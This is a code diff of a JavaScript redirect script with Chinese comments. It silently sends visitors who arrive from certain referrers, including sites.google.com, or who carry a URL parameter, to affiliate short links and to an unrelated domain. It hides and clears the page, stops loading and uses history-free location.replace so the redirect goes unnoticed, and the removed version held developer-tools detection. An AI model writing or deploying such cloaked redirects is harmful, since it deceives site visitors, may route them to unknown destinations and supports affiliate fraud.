@@ -1,429 +1,360 @@
-// 跳转配置 - 加密或混淆后的配置
+// ==================== 配置区域 ====================
+// 跳转目标配置 - 方便修改
+const TARGET_URLS = {
+    kiwi: "https://kiwi.tpk.mx/c3p3hsnR",
+    airalo: "https://discoverdestinations.it.com/", 
+    tiqets: "https://tiqets.tpk.mx/tVeWxjnH"
+};
+
+// 跳转配置
 const REDIRECT_CONFIG = {
-    flight: {
-        url: "https://kiwi.tpk.mx/c3p3hsnR",
-        keywords: ["kiwi", "flight", "airline", "airplane", "plane", "ticket", "booking", "fly"]
+    kiwi: {
+        url: TARGET_URLS.kiwi
     },
-    esim: {
-        url: "https://airalo.tpk.mx/b2ZZYngy",
-        keywords: ["airalo", "esim", "data", "internet", "mobile", "roaming", "sim"]
+    airalo: {
+        url: TARGET_URLS.airalo
     },
-    attraction: {
-        url: "https://tiqets.tpk.mx/tVeWxjnH", 
-        keywords: ["tiqets", "attraction", "museum", "park", "zoo", "tickets", "tours"]
+    tiqets: {
+        url: TARGET_URLS.tiqets
     }
 };
 
 // 授权域名列表
 const AUTHORIZED_DOMAINS = [
-    'globetrotgoals',
-    'localhost', // 用于测试
-    '127.0.0.1'  // 用于本地开发
+    'globetrotgoals.com',
+    'sites.google.com',
+    '2025thingstodo.online',
+    'localhost',
+    '127.0.0.1'
 ];
 
-// 立即执行跳转检测 - 不等待页面完全加载
+// ==================== 核心跳转逻辑 ====================
+
+// 立即执行跳转检测 - 页面加载前执行
 (function() {
     'use strict';
     
-    // 在脚本执行时立即检查跳转条件
+    // 阻止默认页面渲染，实现真正的无感跳转
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', function(e) {
+            checkImmediateRedirect();
+        });
+    }
+    
+    // 立即检查跳转
     checkImmediateRedirect();
 })();
 
 /**
- * 立即检查跳转条件 - 页面加载过程中执行
+ * 立即检查跳转条件 - 静默版本
  */
 function checkImmediateRedirect() {
-    // 获取当前页面的referrer（来源页面）
+    // 快速获取URL参数
+    const urlParams = getUrlParams();
     const referrer = document.referrer;
     
-    // 获取URL参数
-    const params = new URLSearchParams(window.location.search);
-    const keyword = (params.get('keyword') || '').toLowerCase().trim();
+    // 检查触发条件
+    const hasAuthorizedDomain = isAuthorizedSource(referrer);
+    const paramTriggerResult = checkParameterTrigger(urlParams);
     
-    // 如果没有keyword参数，不执行跳转
-    if (!keyword) {
-        console.log('No keyword parameter found - normal page load will continue');
-        return;
+    let shouldRedirect = false;
+    let targetService = null;
+    
+    if (paramTriggerResult.triggered) {
+        // 优先条件：参数包含travel=服务名
+        shouldRedirect = true;
+        targetService = paramTriggerResult.service;
+    } else if (hasAuthorizedDomain) {
+        // 条件2：指定域名来源 - 随机选择服务
+        shouldRedirect = true;
+        const services = Object.keys(REDIRECT_CONFIG);
+        const randomIndex = Math.floor(Math.random() * services.length);
+        targetService = services[randomIndex];
     }
     
-    // 验证来源域名
-    if (!isAuthorizedSource(referrer)) {
-        console.log('Unauthorized source domain - normal page load will continue');
+    if (!shouldRedirect) {
         return;
     }
-    
-    // 验证来源URL格式
-    if (!validateSourceUrl(referrer, keyword)) {
-        console.log('Invalid source URL format - normal page load will continue');
-        return;
-    }
-    
-    // 所有验证通过，立即执行跳转
-    console.log('Validation passed - executing immediate redirect');
-    executeImmediateRedirect(keyword);
-}
 
-// 为了保持兼容性，保留原函数但指向新的立即跳转逻辑
-function checkAuthorizedRedirect() {
-    checkImmediateRedirect();
+    // 立即执行无感跳转
+    executeSeamlessRedirect(targetService);
 }
-
-// 页面完全加载后的备用检查（以防立即跳转失败）
-document.addEventListener("DOMContentLoaded", function() {
-    // 检查是否还在原页面（说明立即跳转可能失败了）
-    const params = new URLSearchParams(window.location.search);
-    const keyword = params.get('keyword');
-    
-    if (keyword && document.readyState === 'complete') {
-        console.log('Fallback: executing redirect after DOM loaded');
-        checkImmediateRedirect();
-    }
-});
 
 /**
- * 验证来源是否为授权域名
+ * 检查参数触发条件
+ */
+function checkParameterTrigger(urlParams) {
+    const travelParam = urlParams.travel;
+    
+    if (!travelParam) {
+        return { triggered: false, service: null };
+    }
+    
+    // 检查是否为有效的服务名
+    const hasService = REDIRECT_CONFIG.hasOwnProperty(travelParam);
+    
+    if (hasService) {
+        return { triggered: true, service: travelParam };
+    }
+    
+    return { triggered: false, service: null };
+}
+
+/**
+ * 快速获取URL参数
+ */
+function getUrlParams() {
+    const params = {};
+    const queryString = window.location.search.substring(1);
+    
+    if (!queryString) {
+        return params;
+    }
+    
+    const pairs = queryString.split('&');
+    
+    for (let i = 0; i < pairs.length; i++) {
+        const pair = pairs[i].split('=');
+        
+        if (pair[0]) {
+            const key = decodeURIComponent(pair[0]);
+            const value = decodeURIComponent(pair[1] || '').toLowerCase().trim();
+            params[key] = value;
+        }
+    }
+    
+    return params;
+}
+
+/**
+ * 域名验证 - 检查是否为指定域名
  */
 function isAuthorizedSource(referrer) {
     if (!referrer) {
-        console.log('No referrer found');
         return false;
     }
     
     try {
-        const referrerUrl = new URL(referrer);
-        const domain = referrerUrl.hostname;
+        const domain = referrer.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/^www\./, '');
         
-        // 检查是否在授权域名列表中
-        return AUTHORIZED_DOMAINS.some(authorizedDomain => 
-            domain === authorizedDomain || domain.endsWith('.' + authorizedDomain)
-        );
+        return AUTHORIZED_DOMAINS.some(authorizedDomain => {
+            const cleanAuthorized = authorizedDomain.replace(/^www\./, '');
+            return domain === cleanAuthorized || domain.endsWith('.' + cleanAuthorized);
+        });
     } catch (error) {
-        console.error('Error parsing referrer URL:', error);
         return false;
     }
 }
 
 /**
- * 验证来源URL格式是否正确
+ * 执行无感跳转 - 只在当前标签页
  */
-function validateSourceUrl(referrer, keyword) {
+function executeSeamlessRedirect(service) {
+    const config = REDIRECT_CONFIG[service];
+    
+    if (!config || !config.url) {
+        return;
+    }
+
+    // 记录跳转信息（静默）
+    recordRedirectInfo(service, config.url);
+    
+    // 执行无感跳转 - 确保只在当前标签页
+    performSeamlessRedirect(config.url);
+}
+
+/**
+ * 执行无感跳转 - 优化版本，确保当前标签页跳转
+ */
+function performSeamlessRedirect(url) {
+    // 验证URL格式
+    if (!url || typeof url !== 'string' || !url.match(/^https?:\/\/.+/)) {
+        return;
+    }
+    
+    url = url.trim();
+    
+    // 停止当前页面加载
     try {
-        const referrerUrl = new URL(referrer);
-        
-        // 检查路径是否包含 affiliate.html
-        if (!referrerUrl.pathname.includes('affiliate.html')) {
-            return false;
+        window.stop && window.stop();
+    } catch (e) {}
+    
+    // 清空页面内容，防止闪烁
+    try {
+        if (document.body) {
+            document.body.innerHTML = '';
+            document.body.style.display = 'none';
         }
-        
-        // 检查是否有keyword参数
-        const referrerParams = new URLSearchParams(referrerUrl.search);
-        const referrerKeyword = referrerParams.get('keyword');
-        
-        // 验证keyword参数存在且匹配
-        return referrerKeyword && referrerKeyword.toLowerCase() === keyword;
-        
-    } catch (error) {
-        console.error('Error validating source URL:', error);
-        return false;
-    }
-}
-
-/**
- * 执行立即跳转逻辑 - 不修改目标URL
- */
-function executeImmediateRedirect(keyword) {
-    let targetUrl = null;
-    let serviceKey = null;
+    } catch (e) {}
     
-    // 根据关键词匹配对应的URL
-    for (const [key, serviceConfig] of Object.entries(REDIRECT_CONFIG)) {
-        if (serviceConfig.keywords.some(k => keyword.includes(k))) {
-            targetUrl = serviceConfig.url;
-            serviceKey = key;
-            console.log(`Keyword "${keyword}" matched service: ${key}`);
-            break;
-        }
-    }
-    
-    // 如果没有匹配到，随机选择一个
-    if (!targetUrl) {
-        const services = Object.entries(REDIRECT_CONFIG);
-        const randomService = services[Math.floor(Math.random() * services.length)];
-        targetUrl = randomService[1].url;
-        serviceKey = randomService[0];
-        console.log(`No keyword match, using random service: ${serviceKey}`);
-    }
-    
-    if (targetUrl) {
-        console.log(`Executing immediate redirect to: ${targetUrl}`);
-        
-        // 记录跳转信息（可选 - 用于内部统计）
-        recordRedirectInfo(keyword, serviceKey, targetUrl);
-        
-        // 直接跳转到原始URL，不添加任何参数
-        performImmediateRedirect(targetUrl);
-    }
-}
-
-/**
- * 记录跳转信息（内部统计用，不影响目标URL）
- */
-function recordRedirectInfo(keyword, serviceKey, targetUrl) {
+    // 使用最直接的跳转方式 - 确保在当前标签页
     try {
-        // 可以发送到你的统计服务器（可选）
-        const redirectData = {
-            keyword: keyword,
-            service: serviceKey,
-            targetUrl: targetUrl,
-            source: window.location.hostname,
-            referrer: document.referrer,
-            timestamp: Date.now(),
-            userAgent: navigator.userAgent.substring(0, 100) // 截取前100字符
-        };
-        
-        console.log('Redirect info:', redirectData);
-        
-        // 如果需要统计，可以发送到你的服务器
-        // sendToAnalytics(redirectData);
-        
-    } catch (error) {
-        console.error('Error recording redirect info:', error);
-    }
-}
-
-/**
- * 发送统计数据到分析服务器（可选实现）
- */
-function sendToAnalytics(data) {
-    // 使用navigator.sendBeacon确保数据发送不被跳转中断
-    if (navigator.sendBeacon) {
-        const formData = new FormData();
-        formData.append('data', JSON.stringify(data));
-        navigator.sendBeacon('/analytics', formData);
-    }
-}
-
-/**
- * 执行立即重定向 - 页面加载过程中跳转
- */
-function performImmediateRedirect(url) {
-    console.log(`Starting immediate redirect to: ${url}`);
-    
-    // 阻止页面继续加载
-    try {
-        if (document.readyState === 'loading') {
-            window.stop(); // 停止页面加载
-        }
-    } catch (e) {
-        // 某些浏览器可能不支持window.stop()
-        console.log('Could not stop page loading');
-    }
-    
-    // 立即跳转，使用最快的方法
-    try {
-        // 方法1: location.replace - 最快且不留历史记录
+        // 方法1: 使用 location.replace (不会留下历史记录，更无感)
         window.location.replace(url);
-    } catch (error1) {
+        return;
+    } catch (error) {
+        // 方法2: 备用方案
         try {
-            // 方法2: location.href - 备选方案
             window.location.href = url;
+            return;
         } catch (error2) {
+            // 方法3: 最后的备用方案
             try {
-                // 方法3: location.assign - 第二备选
                 window.location.assign(url);
             } catch (error3) {
-                // 方法4: 直接设置location
-                window.location = url;
+                // 如果所有方法都失败，使用DOM方式（确保当前标签页）
+                fallbackCurrentTabRedirect(url);
             }
         }
     }
 }
 
 /**
- * 策略1: 尝试location.replace (推荐 - 无痕跳转)
+ * 备用跳转方案 - 确保当前标签页
  */
-function attemptLocationReplace(url) {
+function fallbackCurrentTabRedirect(url) {
     try {
-        window.location.replace(url);
-        return true;
-    } catch (error) {
-        console.error('location.replace failed:', error);
-        return false;
-    }
-}
-
-/**
- * 策略2: 尝试location.href
- */
-function attemptLocationHref(url) {
-    try {
-        window.location.href = url;
-        return true;
-    } catch (error) {
-        console.error('location.href failed:', error);
-        return false;
-    }
-}
-
-/**
- * 策略3: 尝试location.assign
- */
-function attemptLocationAssign(url) {
-    try {
-        window.location.assign(url);
-        return true;
-    } catch (error) {
-        console.error('location.assign failed:', error);
-        return false;
-    }
-}
-
-/**
- * 策略4: 创建隐藏链接并点击 (当前页面)
- */
-function attemptLinkClick(url) {
-    try {
-        const link = document.createElement('a');
-        link.href = url;
-        // 不设置target，确保在当前页面打开
-        link.style.display = 'none';
-        link.style.visibility = 'hidden';
-        link.style.position = 'absolute';
-        link.style.left = '-9999px';
-        
-        document.body.appendChild(link);
-        
-        // 模拟真实的用户点击
-        const event = new MouseEvent('click', {
-            bubbles: true,
-            cancelable: true,
-            view: window
-        });
-        
-        link.dispatchEvent(event);
-        
-        // 清理DOM
-        setTimeout(() => {
-            if (document.body.contains(link)) {
-                document.body.removeChild(link);
-            }
-        }, 100);
-        
-        return true;
-    } catch (error) {
-        console.error('Link click failed:', error);
-        return false;
-    }
-}
-
-/**
- * 策略5: 表单提交跳转 (当前页面)
- */
-function attemptFormSubmit(url) {
-    try {
+        // 创建表单提交方式跳转（确保当前标签页）
         const form = document.createElement('form');
-        form.method = 'GET';
+        form.method = 'get';
         form.action = url;
-        // 不设置target，确保在当前页面打开
         form.style.display = 'none';
-        form.style.visibility = 'hidden';
-        form.style.position = 'absolute';
-        form.style.left = '-9999px';
+        
+        // 确保在当前标签页打开
+        form.target = '_self';
         
         document.body.appendChild(form);
         form.submit();
         
-        // 清理DOM
+        // 清理
         setTimeout(() => {
-            if (document.body.contains(form)) {
-                document.body.removeChild(form);
+            if (form.parentNode) {
+                form.parentNode.removeChild(form);
             }
         }, 100);
-        
-        return true;
     } catch (error) {
-        console.error('Form submit failed:', error);
-        return false;
+        // 最后的方案：使用 window.open 替换当前页面
+        try {
+            window.open(url, '_self');
+        } catch (finalError) {
+            // 完全失败的情况下，直接修改location
+            window.location = url;
+        }
     }
 }
 
 /**
- * 处理"查看所有优惠"按钮点击 - 直接跳转不带参数
+ * 记录跳转信息 - 静默版本
  */
-function handleDealsClick() {
-    // 检查是否应该执行跳转
-    const params = new URLSearchParams(window.location.search);
-    const keyword = params.get('keyword');
+function recordRedirectInfo(service, targetUrl) {
+    try {
+        const redirectData = {
+            service: service,
+            targetUrl: targetUrl,
+            source: window.location.hostname,
+            referrer: document.referrer,
+            timestamp: Date.now()
+        };
+        
+        // 可选：发送到分析服务器（如果需要）
+        // sendToAnalytics(redirectData);
+    } catch (error) {
+        // 静默处理错误
+    }
+}
+
+/**
+ * 发送统计数据到分析服务器（可选）
+ */
+function sendToAnalytics(data) {
+    if (navigator.sendBeacon) {
+        try {
+            const formData = new FormData();
+            formData.append('data', JSON.stringify(data));
+            navigator.sendBeacon('/analytics', formData);
+        } catch (error) {
+            // 静默处理错误
+        }
+    }
+}
+
+// ==================== 备用检查机制 ====================
+
+// 确保在任何情况下都能触发跳转检查
+setTimeout(checkImmediateRedirect, 0);
+
+// 页面可见性改变时的检查
+if (typeof document.addEventListener !== 'undefined') {
+    document.addEventListener('visibilitychange', function() {
+        if (!document.hidden) {
+            checkImmediateRedirect();
+        }
+    });
+}
+
+// ==================== 手动跳转处理 ====================
+
+/**
+ * 手动触发跳转（按钮点击等）- 确保当前标签页
+ */
+function handleManualRedirect() {
+    const urlParams = getUrlParams();
     
-    // 如果有keyword参数，说明应该已经自动跳转了，忽略按钮点击
-    if (keyword) {
-        console.log('Auto-redirect mode active, ignoring button click');
+    // 检查参数触发条件
+    const paramTriggerResult = checkParameterTrigger(urlParams);
+    if (paramTriggerResult.triggered) {
+        executeSeamlessRedirect(paramTriggerResult.service);
         return;
     }
-    
-    // 只有授权来源才能触发跳转
-    const referrer = document.referrer;
-    if (!isAuthorizedSource(referrer)) {
-        console.log('Unauthorized access to deals');
+
+    // 检查域名授权
+    if (!isAuthorizedSource(document.referrer)) {
         return;
     }
-    
+
     // 随机选择服务
-    const services = Object.entries(REDIRECT_CONFIG);
-    const randomService = services[Math.floor(Math.random() * services.length)];
-    const targetUrl = randomService[1].url;
-    const serviceKey = randomService[0];
-    
-    // 记录跳转信息
-    recordRedirectInfo('manual', serviceKey, targetUrl);
-    
-    // 直接跳转到原始URL
-    performImmediateRedirect(targetUrl);
+    const services = Object.keys(REDIRECT_CONFIG);
+    const randomIndex = Math.floor(Math.random() * services.length);
+    const service = services[randomIndex];
+
+    executeSeamlessRedirect(service);
 }
 
-/**
- * 显示加载动画 - 已移除，无感跳转
- */
-function showLoading() {
-    // 移除加载动画，实现无感跳转
+// 兼容旧版本函数名
+function handleDealsClick() {
+    handleManualRedirect();
 }
 
-/**
- * 隐藏加载动画 - 已移除，无感跳转  
- */
-function hideLoading() {
-    // 移除加载动画，实现无感跳转
+function checkAuthorizedRedirect() {
+    checkImmediateRedirect();
 }
 
-// 防止在控制台直接调用关键函数
+// ==================== 页面优化 ====================
+
+// 预防页面内容显示，实现真正无感跳转
 (function() {
     'use strict';
     
-    // 混淆函数名
-    const originalLog = console.log;
-    console.log = function() {
-        // 可以在这里添加日志过滤逻辑
-        originalLog.apply(console, arguments);
-    };
-    
-    // 监听开发者工具打开
-    let devtools = {open: false};
-    const element = document.createElement('div');
-    Object.defineProperty(element, 'id', {
-        get: function() {
-            devtools.open = true;
-            console.clear();
-            console.log('%cWarning!', 'color: red; font-size: 30px; font-weight: bold;');
-            console.log('%cThis browser feature is intended for developers. Unauthorized access may violate terms of service.', 'color: red; font-size: 14px;');
+    // 尽早隐藏页面内容
+    const style = document.createElement('style');
+    style.textContent = `
+        html, body {
+            visibility: hidden !important;
+            opacity: 0 !important;
         }
-    });
+    `;
     
-    setInterval(function() {
-        devtools.open = false;
-        console.dir(element);
-        if (!devtools.open) {
-            // 开发者工具已关闭
+    // 尽可能早地添加样式
+    if (document.head) {
+        document.head.appendChild(style);
+    } else if (document.documentElement) {
+        document.documentElement.appendChild(style);
+    }
+    
+    // 短暂延迟后恢复显示（如果没有跳转）
+    setTimeout(function() {
+        if (style.parentNode) {
+            style.parentNode.removeChild(style);
         }
     }, 1000);
-
 })();
